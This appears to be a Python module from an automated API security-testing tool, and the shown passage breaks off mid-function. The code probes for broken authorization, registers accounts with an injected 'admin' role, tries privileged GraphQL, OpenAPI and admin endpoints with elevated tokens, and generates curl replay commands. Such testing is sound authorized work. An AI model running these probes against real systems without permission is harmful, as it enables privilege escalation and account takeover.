"""Skill: test_api_security — API authz, mass assignment, verb tampering."""
from __future__ import annotations
import asyncio
import base64
import html
import json
import logging
import re
import secrets
import shlex
from typing import Any
from .attempt_auth import LOGIN_PATHS as AUTH_LOGIN_PATHS
from .attempt_auth import _discover_asset_auth_paths
from .attempt_auth import _extract_token_and_user_info
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

MASS_ASSIGN_FIELDS = _load_ds("test_api_security", "mass_assign_fields")  # ADR-007 Phase 3-9 — data in data/payloads/test_api_security.json

VERB_TAMPER_PATHS = _load_ds("test_api_security", "verb_tamper_paths")  # ADR-007 Phase 3-9 — data in data/payloads/test_api_security.json

GRAPHQL_PATHS = ("/graphql", "/api/graphql", "/gql")
OPENAPI_PATHS = (
    "/openapi.json",
    "/swagger.json",
    "/api-docs",
    "/v3/api-docs",
    "/swagger/v1/swagger.json",
    "/docs/swagger.json",
)
_PRIVILEGED_PROBE_PATHS = (
    "/admin/panel",
    "/admin",
    "/administration",
    "/dashboard",
    "/manage",
    "/api/admin",
    "/api/admin/users",
    "/api/Users/",
    "/api/users",
)
_PRIVILEGED_RESOURCE_HINTS = (
    "admin",
    "role",
    "permission",
    "config",
    "setting",
    "user",
    "member",
    "account",
    "team",
    "group",
    "invite",
)
_PRIVILEGED_WRITE_HINTS = (
    "create",
    "update",
    "delete",
    "remove",
    "assign",
    "grant",
    "promote",
    "set",
    "change",
    "invite",
    "enable",
    "disable",
    "reset",
)
_SELF_WRITE_RESOURCE_HINTS = (
    "account",
    "profile",
    "user",
    "email",
    "phone",
    "number",
    "vehicle",
)
_SELF_WRITE_ACTION_HINTS = (
    "change",
    "update",
    "edit",
    "set",
    "add",
    "verify",
)
_SELF_WRITE_SKIP_HINTS = (
    "login",
    "logout",
    "signup",
    "register",
    "forgot",
    "forget",
    "reset",
    "dashboard",
    "shop",
    "product",
    "order",
    "comment",
    "post",
    "mechanic",
    "contact",
    "convert",
    "resend",
)

_GRAPHQL_INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }
        type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
      }
    }
  }
}
""".strip()


_NEXT_DATA_RE = re.compile(
    r"<script[^>]+id=[\"']__NEXT_DATA__[\"'][^>]*>(.*?)</script>",
    re.IGNORECASE | re.DOTALL,
)
_JS_REF_RE = re.compile(r"(?:src|href)=[\"']([^\"']+\.js(?:\?[^\"']*)?)[\"']", re.IGNORECASE)
_ADMIN_ROUTE_RE = re.compile(r"[\"'](/admin(?:/[A-Za-z0-9_.~:/?#\[\]@!$&'()*+,;=%-]*)?)[\"']\s*:")
_ADMIN_ROUTE_LOOSE_RE = re.compile(r"(?<![A-Za-z0-9_])(/admin/[A-Za-z0-9_.~:/?#\[\]@!$&'()*+,;=%-]+)")
_ACTION_ENDPOINT_RE = re.compile(r"[\"']([A-Za-z][A-Za-z0-9_-]*/R)[\"']")
_ACTION_NAME_RE = re.compile(r"[\"']?(Get[A-Za-z0-9_]{2,})[\"']?")
_ERROR_FIELD_RE = re.compile(r"""field ['"]([A-Za-z][A-Za-z0-9_-]{0,63})['"]""", re.IGNORECASE)
_MISSING_FIELD_RE = re.compile(
    r"""missing required (?:property|field) ['"]?([A-Za-z][A-Za-z0-9_-]{0,63})['"]?""",
    re.IGNORECASE,
)


def _normalize_path(path: str) -> str:
    if path.startswith("http://") or path.startswith("https://"):
        from urllib.parse import urlparse

        parsed = urlparse(path)
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
    if not path.startswith("/"):
        path = f"/{path}"
    return path.split("#", 1)[0]


def _extract_next_data(body: str) -> dict[str, Any]:
    match = _NEXT_DATA_RE.search(body or "")
    if not match:
        return {}
    try:
        return json.loads(html.unescape(match.group(1)))
    except Exception:
        return {}


def _extract_js_paths(body: str) -> list[str]:
    seen: set[str] = set()
    paths: list[str] = []
    for match in _JS_REF_RE.finditer(body or ""):
        path = _normalize_path(html.unescape(match.group(1)))
        if path.endswith(".js") or ".js?" in path:
            path = path.split("?", 1)[0]
            if path not in seen:
                seen.add(path)
                paths.append(path)
    return paths


def _extract_admin_routes(text: str) -> list[str]:
    routes: set[str] = set()
    for regex in (_ADMIN_ROUTE_RE, _ADMIN_ROUTE_LOOSE_RE):
        for match in regex.finditer(text or ""):
            route = _normalize_path(match.group(1))
            route = route.split("?", 1)[0].rstrip("/") or "/"
            if route.startswith("/admin") and "_next/" not in route and not route.endswith(".js"):
                routes.add(route)
    return sorted(routes)


def _page_matches_route(next_data: dict[str, Any], route: str) -> bool:
    page = str(next_data.get("page", "")).rstrip("/")
    wanted = route.split("?", 1)[0].rstrip("/")
    return bool(page and wanted and page == wanted)


def _route_to_action_candidates(route: str) -> dict[str, set[str]]:
    parts = [p for p in route.split("?", 1)[0].split("/") if p]
    if len(parts) < 3 or parts[0] != "admin":
        return {}

    module = parts[1]
    noun = parts[2]
    if noun in {"detail", "list", "admin"} and len(parts) >= 4:
        noun = parts[3]
    if noun.endswith("_bak"):
        noun = noun[:-4]

    def pascal(value: str) -> str:
        return "".join(piece.capitalize() for piece in re.split(r"[-_]", value) if piece)

    actions = {f"Get{pascal(noun)}List"}
    if noun == "permission":
        actions.update({"GetPermissionNameList", "GetUserTeamList"})
    endpoint = f"/{module}/R"
    return {endpoint: actions}


def _merge_action_candidates(dst: dict[str, set[str]], src: dict[str, set[str]]) -> None:
    for endpoint, actions in src.items():
        endpoint = _normalize_path(endpoint)
        dst.setdefault(endpoint, set()).update(actions)


def _extract_action_candidates(text: str) -> dict[str, set[str]]:
    endpoints = {
        _normalize_path(match.group(1))
        for match in _ACTION_ENDPOINT_RE.finditer(text or "")
    }
    actions = {
        match.group(1)
        for match in _ACTION_NAME_RE.finditer(text or "")
        if len(match.group(1)) <= 80
    }
    if not endpoints or not actions:
        return {}
    return {endpoint: set(actions) for endpoint in endpoints}


def _non_empty_json_value(value: Any) -> bool:
    if value is None:
        return False
    if isinstance(value, (list, tuple, set)):
        return len(value) > 0
    if isinstance(value, dict):
        return any(_non_empty_json_value(v) for v in value.values())
    if isinstance(value, str):
        return bool(value.strip())
    return bool(value)


def _is_unauthenticated_data_response(text: str) -> bool:
    try:
        parsed = json.loads(text)
    except Exception:
        return False

    if not isinstance(parsed, dict):
        return _non_empty_json_value(parsed)

    error_msg = str(
        parsed.get("error_msg")
        or parsed.get("error")
        or parsed.get("message")
        or ""
    ).strip().lower()
    if error_msg and any(
        marker in error_msg
        for marker in ("login", "unauth", "forbidden", "denied", "error#")
    ):
        return False

    total_count = parsed.get("total_count")
    if isinstance(total_count, int) and total_count > 0:
        return True
    if isinstance(total_count, str) and total_count.isdigit() and int(total_count) > 0:
        return True

    return _non_empty_json_value(parsed.get("data"))


def _load_json(text: str) -> Any:
    try:
        return json.loads(text)
    except Exception:
        return None


def _decode_jwt_claims(token: str) -> dict[str, Any]:
    parts = str(token or "").split(".")
    if len(parts) < 2:
        return {}
    payload = parts[1].strip()
    if not payload:
        return {}
    try:
        decoded = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    except Exception:
        return {}
    parsed = _load_json(decoded.decode("utf-8", "ignore"))
    return parsed if isinstance(parsed, dict) else {}


def _claim_value(claims: dict[str, Any], *paths: tuple[str, ...]) -> Any:
    for path in paths:
        current: Any = claims
        for part in path:
            if not isinstance(current, dict):
                current = None
                break
            current = current.get(part)
        if current not in (None, ""):
            return current
    return None


def _curl_request_command(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    json_body: dict[str, Any] | None = None,
) -> str:
    parts = ["curl", "-sS", "-i", "-X", method.upper()]
    for key, value in (headers or {}).items():
        parts.extend(["-H", f"{key}: {value}"])
    if json_body is not None:
        parts.extend(
            [
                "-H",
                "Content-Type: application/json",
                "--data",
                json.dumps(json_body, separators=(",", ":"), sort_keys=True),
            ]
        )
    parts.append(url)
    return " ".join(shlex.quote(part) for part in parts)


def _looks_privileged_operation(*parts: str) -> bool:
    blob = " ".join(str(part or "") for part in parts).lower()
    if not blob.strip():
        return False
    if any(hint in blob for hint in ("admin", "role", "permission")):
        return True
    return any(hint in blob for hint in _PRIVILEGED_WRITE_HINTS) and any(
        hint in blob for hint in _PRIVILEGED_RESOURCE_HINTS
    )


def _sample_privileged_payload(*parts: str) -> dict[str, Any]:
    blob = " ".join(str(part or "") for part in parts).lower()
    payload: dict[str, Any] = {}
    if any(hint in blob for hint in ("user", "member", "account")):
        payload["userId"] = 1
    if any(hint in blob for hint in ("team", "group")):
        payload["teamId"] = 1
    if "role" in blob:
        payload["role"] = "admin"
    if "permission" in blob:
        payload["permission"] = "admin"
    if "config" in blob or "setting" in blob:
        payload.setdefault("key", "mode")
        payload.setdefault("value", "enabled")
    if any(hint in blob for hint in ("enable", "disable", "active")):
        payload["enabled"] = True
    if any(hint in blob for hint in ("delete", "remove")):
        payload["confirm"] = True
    if not payload:
        payload["id"] = 1
    return payload


def _is_privileged_mass_assign_field(field_info: dict[str, Any]) -> bool:
    blob = f"{field_info.get('field') or ''} {field_info.get('value') or ''}".lower()
    return any(token in blob for token in ("role", "admin", "isadmin", "is_admin", "privilege", "permission", "staff"))


def _merge_field_values(*sources: dict[str, str]) -> dict[str, str]:
    merged: dict[str, str] = {}
    for source in sources:
        for key, value in dict(source or {}).items():
            text = str(value or "").strip()
            if text:
                merged.setdefault(str(key).lower(), text)
    return merged


def _looks_self_write_surface(path: str) -> bool:
    lower = _normalize_path(path).split("?", 1)[0].lower()
    if not lower or any(marker in lower for marker in _SELF_WRITE_SKIP_HINTS):
        return False
    return any(token in lower for token in _SELF_WRITE_RESOURCE_HINTS) and any(
        token in lower for token in _SELF_WRITE_ACTION_HINTS
    )


def _preview_field_values(preview: str) -> dict[str, str]:
    parsed = _load_json(preview)
    values: dict[str, str] = {}

    def walk(item: Any) -> None:
        if isinstance(item, dict):
            for key, nested in item.items():
                lower = str(key).lower()
                if lower in {"email", "phone", "number", "username", "name"} and isinstance(nested, (str, int)):
                    text = str(nested).strip()
                    if text:
                        values.setdefault(lower, text)
                elif isinstance(nested, (dict, list)):
                    walk(nested)
        elif isinstance(item, list):
            for nested in item[:3]:
                walk(nested)

    if parsed is not None:
        walk(parsed)
    return values


def _identity_field_values(identities: Any) -> dict[str, str]:
    values: dict[str, str] = {}
    raw_items: list[Any]
    if isinstance(identities, dict):
        raw_items = list(identities.values())
    elif isinstance(identities, list):
        raw_items = list(identities)
    else:
        raw_items = []
    for item in raw_items[:10]:
        if not isinstance(item, dict):
            continue
        for key in ("email", "phone", "number", "username", "name"):
            text = str(item.get(key) or "").strip()
            if text:
                values.setdefault(key, text)
    return values


def _self_write_seed_values(endpoints: Any, identities: Any) -> dict[str, str]:
    values: dict[str, str] = {}
    for item in list(endpoints or [])[:60]:
        if not isinstance(item, dict):
            continue
        preview_values = _preview_field_values(str(item.get("preview_auth") or item.get("preview") or ""))
        values = _merge_field_values(values, preview_values)
    return _merge_field_values(values, _identity_field_values(identities))


def _shifted_email(value: str, suffix: str) -> str:
    text = str(value or "").strip()
    if "@" not in text:
        return f"user.{suffix}@example.test"
    local, _, domain = text.partition("@")
    return f"{local}+{suffix}@{domain}"


def _shifted_phone(value: str, suffix: str) -> str:
    digits = re.sub(r"\D", "", str(value or ""))
    tail = f"{int(suffix[-4:], 16) % 10000:04d}"
    prefix = digits[:-4] if len(digits) > 4 else "555010"
    return f"{prefix}{tail}"


def _sample_self_write_field_value(field_name: str, seed_values: dict[str, str], suffix: str) -> Any:
    lower = str(field_name or "").lower()
    uses_current = any(token in lower for token in ("old", "current", "existing"))
    if "email" in lower:
        current = seed_values.get("email", "")
        if uses_current:
            return current or None
        return _shifted_email(current, suffix)
    if "number" in lower or "phone" in lower:
        current = seed_values.get("phone") or seed_values.get("number") or ""
        if uses_current:
            return current or None
        return _shifted_phone(current, suffix)
    if "name" in lower:
        current = seed_values.get("name") or seed_values.get("username") or "user"
        if uses_current:
            return current or None
        return f"{current}-{suffix}"
    if "vin" in lower:
        return f"VIN{suffix}".upper()
    if "pincode" in lower or lower == "pin":
        return "1234"
    if "verified" in lower:
        return False
    return None


def _sample_self_write_body(
    path: str,
    preview: str = "",
    *,
    seed_values: dict[str, str] | None = None,
) -> dict[str, Any] | None:
    lower = _normalize_path(path).split("?", 1)[0].lower()
    values = _merge_field_values(_preview_field_values(preview), dict(seed_values or {}))
    suffix = secrets.token_hex(4)
    body: dict[str, Any] = {}
    if "email" in lower:
        body["email"] = _shifted_email(values.get("email", ""), suffix)
    if "phone" in lower or "number" in lower:
        number = _shifted_phone(values.get("phone") or values.get("number") or "", suffix)
        body["number"] = number
        if "phone" in lower:
            body["phone"] = number
    if "vehicle" in lower:
        body.setdefault("vin", f"VIN{suffix}".upper())
        body.setdefault("pincode", "1234")
    if "verify" in lower:
        if values.get("email") and "email" not in body:
            body["email"] = values["email"]
        body.setdefault("verified", False)
    if ("profile" in lower or "account" in lower or "/user/" in lower) and not body:
        if values.get("email"):
            body["email"] = values["email"]
        body["name"] = values.get("name") or f"user-{suffix}"
    return body or None


def _extract_required_fields(text: str) -> list[str]:
    parsed = _load_json(text)
    haystacks = [str(text or "")]
    if isinstance(parsed, dict):
        haystacks.extend(
            str(parsed.get(key) or "")
            for key in ("details", "message", "error", "errors")
        )
    fields: list[str] = []
    seen: set[str] = set()
    for regex in (_ERROR_FIELD_RE, _MISSING_FIELD_RE):
        for haystack in haystacks:
            for match in regex.finditer(haystack):
                field = str(match.group(1) or "").strip()
                if not field:
                    continue
                lowered = field.lower()
                if lowered in seen:
                    continue
                seen.add(lowered)
                fields.append(field)
    return fields[:8]


def _adapt_self_write_body(
    path: str,
    body: dict[str, Any],
    response_text: str,
    *,
    seed_values: dict[str, str] | None = None,
) -> dict[str, Any] | None:
    required_fields = _extract_required_fields(response_text)
    if not required_fields:
        return None
    suffix = secrets.token_hex(4)
    adapted = dict(body)
    changed = False
    for field in required_fields:
        if adapted.get(field) not in (None, ""):
            continue
        value = _sample_self_write_field_value(field, dict(seed_values or {}), suffix)
        if value is None:
            continue
        adapted[field] = value
        changed = True
    if not changed:
        return None
    return adapted


def _self_write_methods(path: str) -> list[str]:
    lower = _normalize_path(path).split("?", 1)[0].lower()
    if any(token in lower for token in ("update", "edit")):
        return ["PUT", "PATCH", "POST"]
    if any(token in lower for token in ("change", "set", "add", "verify")):
        return ["POST", "PUT", "PATCH"]
    return ["POST"]


def _graphql_leaf_type(type_info: dict[str, Any] | None) -> tuple[str, str]:
    current = type_info or {}
    while isinstance(current, dict) and current.get("ofType"):
        current = current.get("ofType") or {}
    if not isinstance(current, dict):
        return "", ""
    return str(current.get("kind") or ""), str(current.get("name") or "")


def _graphql_literal(value: Any, *, kind: str, type_name: str) -> str:
    if kind == "ENUM":
        return re.sub(r"[^A-Z0-9_]", "_", str(value).upper()) or "ADMIN"
    if type_name in {"Int", "Float"} and isinstance(value, (int, float)):
        return str(value)
    if type_name == "Boolean" and isinstance(value, bool):
        return "true" if value else "false"
    if type_name == "ID" and isinstance(value, int):
        return str(value)
    return json.dumps(str(value))


def _sample_graphql_value(arg_name: str, *, kind: str, type_name: str) -> Any:
    name = str(arg_name or "").lower()
    if "id" in name:
        return 1
    if any(hint in name for hint in ("role", "permission", "scope")):
        return "ADMIN" if kind == "ENUM" else "admin"
    if any(hint in name for hint in ("enabled", "active", "admin")):
        return True if type_name == "Boolean" else "admin"
    if type_name in {"Int", "Float"}:
        return 1
    if type_name == "Boolean":
        return True
    return "test"


def _extract_graphql_privileged_candidates(
    schema: dict[str, Any],
    path: str,
) -> list[dict[str, Any]]:
    mutation_type = str((schema.get("mutationType") or {}).get("name") or "")
    if not mutation_type:
        return []
    mutation = next(
        (
            item
            for item in list(schema.get("types") or [])
            if isinstance(item, dict) and str(item.get("name") or "") == mutation_type
        ),
        None,
    )
    if not isinstance(mutation, dict):
        return []
    candidates: list[dict[str, Any]] = []
    for field in list(mutation.get("fields") or []):
        if not isinstance(field, dict):
            continue
        name = str(field.get("name") or "")
        if not _looks_privileged_operation(name):
            continue
        args_text: list[str] = []
        for arg in list(field.get("args") or [])[:4]:
            if not isinstance(arg, dict):
                continue
            kind, type_name = _graphql_leaf_type(arg.get("type") if isinstance(arg.get("type"), dict) else {})
            value = _sample_graphql_value(str(arg.get("name") or ""), kind=kind, type_name=type_name)
            args_text.append(
                f"{arg.get('name')}: {_graphql_literal(value, kind=kind, type_name=type_name)}"
            )
        return_kind, _return_name = _graphql_leaf_type(
            field.get("type") if isinstance(field.get("type"), dict) else {}
        )
        selection = " { __typename }" if return_kind in {"OBJECT", "INTERFACE", "UNION"} else ""
        joined_args = f"({', '.join(args_text)})" if args_text else ""
        query = f"mutation {{ {name}{joined_args}{selection} }}"
        candidates.append(
            {
                "kind": "graphql",
                "path": _normalize_path(path).split("?", 1)[0],
                "method": "POST",
                "json_body": {"query": query},
            }
        )
    return candidates[:8]


def _extract_openapi_privileged_candidates(parsed: dict[str, Any]) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    base_path = str(parsed.get("base_path") or "")
    for operation in list(parsed.get("endpoints") or []):
        if not isinstance(operation, dict):
            continue
        method = str(operation.get("method") or "").upper()
        raw_path = str(operation.get("path") or "")
        if method not in {"POST", "PUT", "PATCH", "DELETE"}:
            continue
        if not _looks_privileged_operation(raw_path, method):
            continue
        sampled = _sample_openapi_path(raw_path)
        if not sampled:
            continue
        candidate: dict[str, Any] = {
            "kind": "http",
            "path": _join_openapi_path(base_path, sampled),
            "method": method,
        }
        if method != "DELETE":
            candidate["json_body"] = _sample_privileged_payload(
                raw_path,
                method,
                " ".join(str((param or {}).get("name") or "") for param in list(operation.get("params") or [])),
            )
        candidates.append(candidate)
    return candidates[:10]


def _extract_action_privileged_candidates(
    action_candidates: dict[str, set[str]],
) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for endpoint, actions in sorted(action_candidates.items())[:12]:
        for action in sorted(actions)[:20]:
            if action.startswith("Get"):
                continue
            if not _looks_privileged_operation(endpoint, action):
                continue
            candidates.append(
                {
                    "kind": "action_api",
                    "path": _normalize_path(endpoint).split("?", 1)[0],
                    "method": "POST",
                    "json_body": {
                        "action": action,
                        "data": _sample_privileged_payload(endpoint, action),
                    },
                    "inject_token_body": True,
                }
            )
    return candidates[:10]


def _extract_discovered_privileged_candidates(endpoints: Any) -> list[Any]:
    candidates: list[Any] = []
    seen: set[str] = set()
    for item in list(endpoints or [])[:40]:
        path = str(item.get("path") or item.get("url") or "") if isinstance(item, dict) else str(item or "")
        method = str(item.get("method") or item.get("verb") or "").upper() if isinstance(item, dict) else ""
        path = _normalize_path(path).split("?", 1)[0]
        if not path or not _looks_privileged_operation(path, method):
            continue
        methods = [method] if method in {"GET", "POST", "PUT", "PATCH", "DELETE"} else []
        if not methods:
            methods = (
                ["POST", "PUT", "PATCH", "GET"]
                if any(token in path.lower() for token in ("admin", "role", "permission"))
                else ["GET"]
            )
        for candidate_method in methods:
            if candidate_method == "GET":
                if path not in seen:
                    seen.add(path)
                    candidates.append(path)
                continue
            candidate: dict[str, Any] = {
                "kind": "http",
                "path": path,
                "method": candidate_method,
            }
            if candidate_method != "DELETE":
                candidate["json_body"] = _sample_privileged_payload(path, candidate_method)
            key = json.dumps(candidate, sort_keys=True, default=str)
            if key in seen:
                continue
            seen.add(key)
            candidates.append(candidate)
    return candidates[:12]


def _extract_discovered_self_write_candidates(
    endpoints: Any,
    *,
    seed_values: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    seen: set[str] = set()
    for item in list(endpoints or [])[:60]:
        path = str(item.get("path") or item.get("url") or "") if isinstance(item, dict) else str(item or "")
        preview = str(item.get("preview_auth") or item.get("preview") or "") if isinstance(item, dict) else ""
        path = _normalize_path(path).split("?", 1)[0]
        if not path or not _looks_self_write_surface(path):
            continue
        body = _sample_self_write_body(path, preview, seed_values=seed_values)
        if not body:
            continue
        for method in _self_write_methods(path):
            candidate = {"kind": "http", "path": path, "method": method, "json_body": dict(body)}
            key = json.dumps(candidate, sort_keys=True, default=str)
            if key in seen:
                continue
            seen.add(key)
            candidates.append(candidate)
    return candidates[:12]


def _privileged_probe_candidates(
    nextjs_findings: list[dict[str, Any]],
    action_candidates: dict[str, set[str]],
    *,
    openapi_candidates: list[dict[str, Any]] | None = None,
    graphql_candidates: list[dict[str, Any]] | None = None,
    discovered_candidates: list[Any] | None = None,
) -> list[Any]:
    candidates: list[Any] = []
    seen: set[str] = set()
    for candidate in (
        list(openapi_candidates or [])
        + list(graphql_candidates or [])
        + _extract_action_privileged_candidates(action_candidates)
        + list(discovered_candidates or [])
    ):
        key = json.dumps(candidate, sort_keys=True, default=str)
        if key in seen:
            continue
        seen.add(key)
        candidates.append(candidate)
    raw_candidates: list[str] = []
    for finding in nextjs_findings:
        payload = str(finding.get("payload") or "")
        if not payload:
            continue
        raw_candidates.extend(part.strip() for part in payload.split(","))
    raw_candidates.extend(action_candidates)
    raw_candidates.extend(_PRIVILEGED_PROBE_PATHS)
    for raw in raw_candidates:
        path = _normalize_path(str(raw or "").strip()).split("?", 1)[0]
        if not path or path in seen:
            continue
        seen.add(path)
        candidates.append(path)
    return candidates


def _probe_request_spec(candidate: Any) -> dict[str, Any]:
    if isinstance(candidate, str):
        return {
            "kind": "http",
            "path": _normalize_path(candidate).split("?", 1)[0],
            "method": "GET",
        }
    if not isinstance(candidate, dict):
        return {}
    path = str(candidate.get("path") or candidate.get("endpoint") or "").strip()
    if not path:
        return {}
    return {
        "kind": str(candidate.get("kind") or "http"),
        "path": _normalize_path(path).split("?", 1)[0],
        "method": str(candidate.get("method") or "GET").upper(),
        "json_body": candidate.get("json_body"),
        "headers": dict(candidate.get("headers") or {}),
        "inject_token_body": bool(candidate.get("inject_token_body")),
    }


def _probe_request_body(candidate: dict[str, Any], token: str | None = None) -> dict[str, Any] | None:
    body = candidate.get("json_body")
    if not isinstance(body, dict):
        return None
    cloned = dict(body)
    if candidate.get("inject_token_body"):
        if token:
            cloned["token"] = token
        else:
            cloned.pop("token", None)
    return cloned


async def _execute_probe_request(
    session: Any,
    *,
    target: str,
    candidate: dict[str, Any],
    token: str | None,
) -> Any:
    headers = dict(candidate.get("headers") or {})
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = _probe_request_body(candidate, token)
    if body is not None:
        headers.setdefault("Content-Type", "application/json")
        headers.setdefault("Accept", "application/json")
    return await session.request(
        str(candidate.get("method") or "GET"),
        f"{target}{candidate['path']}",
        headers=headers or None,
        json_data=body,
    )


async def _probe_privileged_access(
    session: Any,
    *,
    target: str,
    elevated_token: str,
    baseline_token: str | None,
    candidate_paths: list[Any],
) -> dict[str, Any]:
    if not elevated_token:
        return {}
    has_baseline = bool(baseline_token and baseline_token != elevated_token)
    for raw_candidate in candidate_paths:
        candidate = _probe_request_spec(raw_candidate)
        if not candidate:
            continue
        try:
            noauth = await _execute_probe_request(
                session,
                target=target,
                candidate=candidate,
                token=None,
            )
            baseline = (
                await _execute_probe_request(
                    session,
                    target=target,
                    candidate=candidate,
                    token=baseline_token,
                )
                if has_baseline
                else None
            )
            elevated = await _execute_probe_request(
                session,
                target=target,
                candidate=candidate,
                token=elevated_token,
            )
        except Exception:
            continue
        if elevated.status not in (200, 201, 204):
            continue
        noauth_status = int(getattr(noauth, "status", 0) or 0)
        baseline_status = int(getattr(baseline, "status", 0) or 0) if baseline else 0
        if has_baseline:
            if baseline_status not in (401, 403):
                continue
        elif noauth_status not in (401, 403):
            continue
        return {
            "endpoint": candidate["path"],
            "method": str(candidate.get("method") or "GET"),
            "request_kind": str(candidate.get("kind") or "http"),
            "json_body": _probe_request_body(candidate),
            "inject_token_body": bool(candidate.get("inject_token_body")),
            "noauth_status": noauth_status,
            "baseline_status": baseline_status,
            "elevated_status": elevated.status,
            "noauth_preview": (getattr(noauth, "text", "") or "")[:180],
            "baseline_preview": (getattr(baseline, "text", "") or "")[:180] if baseline else "",
            "elevated_preview": (getattr(elevated, "text", "") or "")[:180],
        }
    return {}


def _baseline_token_from_identities(foothold_token: str | None, identities: Any) -> str | None:
    for item in list(identities or []):
        if not isinstance(item, dict):
            continue
        token = str(item.get("token") or item.get("bearer") or "").strip()
        if token and token != str(foothold_token or "").strip():
            return token
    return None


async def _login_mass_assignment_account(
    session: Any,
    *,
    target: str,
    email: str,
    username: str,
    password: str,
    expected_role: str | None = None,
) -> dict[str, Any]:
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    attempts = [
        ("email", {"email": email, "password": password}),
        ("username", {"username": username, "password": password}),
    ]
    login_paths = [str(path) for path in AUTH_LOGIN_PATHS]
    try:
        for path in await _discover_asset_auth_paths(session):
            lower = path.lower()
            if any(marker in lower for marker in ("login", "sign-in", "sign_in", "signin")) and path not in login_paths:
                login_paths.append(path)
    except Exception:
        pass
    for path in login_paths:
        for identity, payload in attempts:
            try:
                response = await session.request(
                    "POST",
                    f"{target}{path}",
                    json_data=payload,
                    headers=headers,
                )
            except Exception:
                continue
            if response.status not in (200, 201):
                continue
            parsed = _load_json(response.text)
            user_info: dict[str, Any] = {}
            raw_token = ""
            if isinstance(parsed, dict):
                token, user_info = _extract_token_and_user_info(parsed)
                raw_token = token
                user = parsed.get("user")
                if isinstance(user, dict):
                    for key in ("email", "role", "id"):
                        if not user_info.get(key) and user.get(key) not in (None, ""):
                            user_info[key] = user.get(key)
                auth = parsed.get("authentication", parsed)
                if isinstance(auth, dict):
                    token_value = auth.get("token")
                    if isinstance(token_value, str) and token_value.strip():
                        raw_token = raw_token or token_value.strip()
                if not raw_token:
                    token_value = parsed.get("token")
                    if isinstance(token_value, str) and token_value.strip():
                        raw_token = token_value.strip()
                if not raw_token:
                    data = parsed.get("data")
                    if isinstance(data, dict):
                        token_value = data.get("token")
                        if isinstance(token_value, str) and token_value.strip():
                            raw_token = token_value.strip()
            jwt_claims = _decode_jwt_claims(raw_token)
            effective_role = str(
                user_info.get("role")
                or _claim_value(jwt_claims, ("role",), ("data", "role"))
                or ""
            ).strip()
            if expected_role and effective_role and effective_role.lower() != expected_role.lower():
                continue
            if effective_role and not user_info.get("role"):
                user_info["role"] = effective_role
            if not user_info.get("email"):
                claim_email = _claim_value(jwt_claims, ("email",), ("data", "email"))
                if claim_email not in (None, ""):
                    user_info["email"] = claim_email
            if not user_info.get("id"):
                claim_id = _claim_value(jwt_claims, ("id",), ("bid",), ("data", "id"))
                if claim_id not in (None, ""):
                    user_info["id"] = claim_id
            response_headers = {
                str(key).lower(): str(value)
                for key, value in dict(getattr(response, "headers", {}) or {}).items()
            }
            return {
                "login_endpoint": path,
                "identity": identity,
                "status": response.status,
                "token_observed": bool(raw_token),
                "session_cookie_observed": bool(response_headers.get("set-cookie")),
                "effective_role": effective_role,
                "user_info": user_info,
                "jwt_claims": jwt_claims,
                "response_preview": response.text[:300],
                "token": raw_token,
            }
    return {}


async def _verify_mass_assignment_login(
    session: Any,
    *,
    target: str,
    registration_path: str,
    email: str,
    username: str,
    password: str,
    persisted_role: str,
    foothold_token: str | None = None,
    baseline_account: dict[str, str] | None = None,
    candidate_paths: list[Any] | None = None,
) -> dict[str, Any]:
    login = await _login_mass_assignment_account(
        session,
        target=target,
        email=email,
        username=username,
        password=password,
        expected_role=persisted_role,
    )
    if not login:
        return {}

    baseline_login: dict[str, Any] = {}
    baseline_token = foothold_token
    if baseline_account:
        baseline_login = await _login_mass_assignment_account(
            session,
            target=target,
            email=str(baseline_account.get("email") or ""),
            username=str(baseline_account.get("username") or ""),
            password=str(baseline_account.get("password") or ""),
        )
        if baseline_login.get("token"):
            baseline_token = str(baseline_login["token"])

    evidence = {
        "login_endpoint": login["login_endpoint"],
        "identity": login["identity"],
        "status": login["status"],
        "token_observed": login["token_observed"],
        "session_cookie_observed": login["session_cookie_observed"],
        "persisted_role": persisted_role,
        "effective_role": login["effective_role"],
        "principal": {
            "email": email,
            "username": username,
            "password": password,
        },
        "user_info": login["user_info"],
        "jwt_claims": login["jwt_claims"],
        "response_preview": login["response_preview"],
    }
    if baseline_account and baseline_login:
        evidence["baseline_login_endpoint"] = baseline_login["login_endpoint"]
        evidence["baseline_identity"] = baseline_login["identity"]
        evidence["baseline_principal"] = {
            "email": str(baseline_account.get("email") or ""),
            "username": str(baseline_account.get("username") or ""),
            "password": str(baseline_account.get("password") or ""),
        }
        evidence["baseline_effective_role"] = baseline_login.get("effective_role") or ""
        evidence["baseline_user_info"] = baseline_login.get("user_info") or {}
        evidence["baseline_jwt_claims"] = baseline_login.get("jwt_claims") or {}
    evidence["replay_commands"] = {
        "register": _curl_request_command(
            "POST",
            f"{target}{registration_path}",
            json_body={
                "email": email,
                "password": password,
                "role": persisted_role,
                "username": username,
            },
        ),
        "relogin": _curl_request_command(
            "POST",
            f"{target}{login['login_endpoint']}",
            json_body={
                login["identity"]: email if login["identity"] == "email" else username,
                "password": password,
            },
        ),
    }
    if baseline_account and baseline_login:
        evidence["replay_commands"]["baseline_register"] = _curl_request_command(
            "POST",
            f"{target}{registration_path}",
            json_body=evidence["baseline_principal"],
        )
        evidence["replay_commands"]["baseline_relogin"] = _curl_request_command(
            "POST",
            f"{target}{baseline_login['login_endpoint']}",
            json_body={
                baseline_login["identity"]: evidence["baseline_principal"]["email"]
                if baseline_login["identity"] == "email"
                else evidence["baseline_principal"]["username"],
                "password": evidence["baseline_principal"]["password"],
            },
        )
    privileged_access_proof = await _probe_privileged_access(
        session,
        target=target,
        elevated_token=str(login.get("token") or ""),
        baseline_token=baseline_token,
